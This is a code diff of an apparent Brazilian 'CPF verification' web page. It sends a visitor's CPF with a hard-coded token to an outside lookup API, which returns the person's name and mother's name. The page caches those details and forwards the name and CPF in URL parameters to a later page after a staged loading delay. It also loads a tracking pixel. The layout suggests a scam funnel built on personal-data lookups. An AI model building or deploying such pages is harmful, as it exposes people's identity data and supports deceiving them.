@@ -1,10 +1,11 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Simplic - Verificação de CPF</title>
     <link href="css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="css/style.css">
-     
 </head>
 <body>
     <header class="header">
@@ -146,7 +147,6 @@
             
             e.target.value = value;
             
-            // Salvar o CPF sem formatação no localStorage sempre que o usuário digitar
             const cpfRaw = value.replace(/\D/g, '');
             if (cpfRaw.length === 11) {
                 localStorage.setItem('cpfUsuario', cpfRaw);
@@ -163,33 +163,18 @@
             const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
             const verifyButton = document.getElementById('verify-button');
             
-            console.log('CPF inserido:', cpf);
-            
             if (cpf.length !== 11) {
-                console.log('CPF inválido - comprimento incorreto');
                 showNotification('Por favor, insira um CPF válido');
                 verifyButton.innerHTML = 'Verificar';
                 return;
             }
 
             try {
-                console.log('Iniciando consulta à API...');
                 const url = `https://bk.elaitech.pro/consultar-filtrada/cpf?cpf=${cpf}&token=4jinxv7me8lhx5nbney6bu`;
-
-                console.log('URL da requisição:', url);
-
-                const response = await fetch(url, {
-                    method: 'GET'
-                });
-
-                console.log('Status da resposta:', response.status);
-
+                const response = await fetch(url, { method: 'GET' });
                 const data = await response.json();
-                console.log('Dados recebidos:', data);
 
                 if (response.ok) {
-                    console.log('Consulta bem sucedida');
-                    
                     const dadosUsuario = {
                         NOME: data.nome,
                         MAE: data.mae || '',
@@ -198,47 +183,25 @@
                     };
                     
                     localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
-                    
-                    console.log('Dados salvos no localStorage');
+                    localStorage.setItem('cpfUsuario', cpf); // 👈 salva pro parâmetro
 
                     document.getElementById('user-name').textContent = dadosUsuario.NOME;
                     document.getElementById('user-cpf').textContent = data.cpfformatado || cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
                     
                     document.getElementById('verification-step').style.display = 'none';
                     document.getElementById('results-step').style.display = 'block';
-                    console.log('Tela de resultados exibida com sucesso');
                 } else {
-                    console.log('CPF não encontrado. Status:', response.status);
                     showNotification('CPF não encontrado');
                     verifyButton.innerHTML = 'Verificar';
                 }
             } catch (error) {
-                console.error('Erro detalhado:', error);
-                console.error('Stack trace:', error.stack);
-                
-                console.log('Usando dados simulados devido ao erro');
-                const dadosUsuario = {
-                    NOME: "GHERSON DYWYNO ESPHYNDOLA",
-                    MAE: "MARIA HELENA",
-                    SEXO: "MASCULINO",
-                    NASCIMENTO: "31/03/1966"
-                };
-                
-                localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
-                
-                document.getElementById('user-name').textContent = dadosUsuario.NOME;
-                document.getElementById('user-cpf').textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-
-                document.getElementById('verification-step').style.display = 'none';
-                document.getElementById('results-step').style.display = 'block';
-                console.log('Tela de resultados exibida com dados simulados');
+                console.error(error);
             }
         });
 
         function getUrlParams() {
             const params = {};
             const queryString = window.location.search;
-
             const urlParams = new URLSearchParams(queryString);
             
             for (const [key, value] of urlParams) {
@@ -246,50 +209,40 @@
             }
             return params;
         }
-    
-        function buildUrlWithParams(baseUrl) {
-            const params = getUrlParams();
-            const url = new URL(baseUrl, window.location.href);
-            
-            Object.keys(params).forEach(key => {
-                url.searchParams.append(key, params[key]);
-            });
-            
-            return url.toString();
-        }
 
         document.getElementById('continue-button').addEventListener('click', function() {
             const params = getUrlParams();
             
             const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
-            if (dadosUsuario) {
-                if (dadosUsuario.NOME) {
-                    params.name = dadosUsuario.NOME;
-                }
+            const cpfUsuario = localStorage.getItem('cpfUsuario'); // 👈 pega cpf salvo
+            
+            if (dadosUsuario?.NOME) {
+                params.name = dadosUsuario.NOME;
+            }
+            if (cpfUsuario) {
+                params.document = cpfUsuario; // 👈 joga no parâmetro
             }
             
-            // Adicionar efeito de carregamento ao botão
             const button = this;
             button.disabled = true;
             button.innerHTML = '<div class="d-flex justify-content-center"><div class="spinner-border spinner-border-sm me-2" role="status"></div> Carregando...</div>';
             
-            // Aumentar o tempo antes de redirecionar
             setTimeout(() => {
                 const url = new URL('../3/index.html', window.location.href);
                 Object.keys(params).forEach(key => {
                     url.searchParams.append(key, params[key]);
                 });
-                
                 window.location.href = url.toString();
-            }, 2500); // 2.5 segundos de carregamento
+            }, 2500);
         });
     </script>
-<script>
-  window.pixelId = "68c1010283093e79085d072a";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
- </body></html>
+    <script>
+      window.pixelId = "68c1010283093e79085d072a";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+</body>
+</html>
